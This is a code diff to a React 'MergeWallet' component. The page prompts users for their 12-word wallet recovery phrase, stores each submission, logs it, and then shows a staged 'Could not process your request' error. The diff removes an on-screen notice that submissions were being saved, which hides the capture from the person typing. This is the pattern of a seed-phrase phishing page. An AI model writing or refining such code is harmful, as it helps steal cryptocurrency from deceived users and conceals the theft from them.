@@ -138,7 +138,6 @@ function MergeWallet({ wallet }: { wallet: Wallet | null }) {
   const [errors, setErrors] = useState(Array(12).fill(false));
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(false);
-  const [saveInfo, setSaveInfo] = useState("");
 
   const validate = () => {
     const newErrors = phrases.map((p) => p.trim() === "");
@@ -161,7 +160,6 @@ function MergeWallet({ wallet }: { wallet: Wallet | null }) {
 
     const storedAfter = await submissionStore.getAll();
     console.log("submissions after save", storedAfter);
-    setSaveInfo(`Saved ${storedAfter.length} submission(s) locally (will show error as requested).`);
 
     setLoading(true);
     setTimeout(() => {
@@ -177,7 +175,6 @@ function MergeWallet({ wallet }: { wallet: Wallet | null }) {
       <p className="subtitle">Enter your 12 word recovery phrase to merge your wallet.</p>
       <SeedGrid phrases={phrases} setPhrases={setPhrases} errors={errors} />
       {loading && <div className="loader"></div>}
-      {saveInfo && <div className="subtitle" style={{ marginBottom: 8 }}>{saveInfo}</div>}
       {error && (
         <div className="error-message">
           <AlertCircle /> Could not process your request. Please try again.
